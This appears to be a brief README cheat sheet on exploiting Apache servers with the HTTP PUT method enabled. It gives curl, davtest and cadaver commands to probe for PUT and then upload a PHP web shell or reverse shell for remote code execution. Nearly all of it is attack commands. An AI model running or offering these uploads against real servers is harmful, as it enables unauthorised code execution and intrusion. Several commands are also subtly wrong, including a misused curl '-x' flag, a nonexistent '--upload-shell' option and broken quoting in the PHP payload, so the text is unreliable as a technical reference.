# Explioting-Apache-PUT
Obtaining code execution by abusing the apache PUT HTTP method

Testing if PUT is enabled via curl
```
curl -x OPTIONS http://10.10.10.10/uploads/ -v

// Replace IP & URI 
```

Testing if PUT is enabled via Davtest
```
davtest -url http://10.10.10.10/uploads/

// Replace IP & URI 
```


Explioting PUT for RCE - Method 1
```
curl -v -x PUT -d '<?php system($_GET['c']);?>' http://10.10.10.10/rev.php

// Replace IP

RCE URL: http://10.10.10.10/rev.php?c=id

```

Explioting PUT for RCE - Method 2
```
curl --upload-shell shell.php -H "Expect: *" http://10.10.10.10/test/shell.php

// Replace IP
// Ensure that the reverse shell (shell.php) is inside your current working directory
// Upload the shell to the target IP:URL where PUT is enabled

```

Explioting PUT for RCE - Method 3
```
cadaver http://10.10.10.10/test/
put shell.php

// Replace IP
// Ensure that the reverse shell (shell.php) is inside your current working directory
// Upload the shell to the target IP:URL where PUT is enabled

```
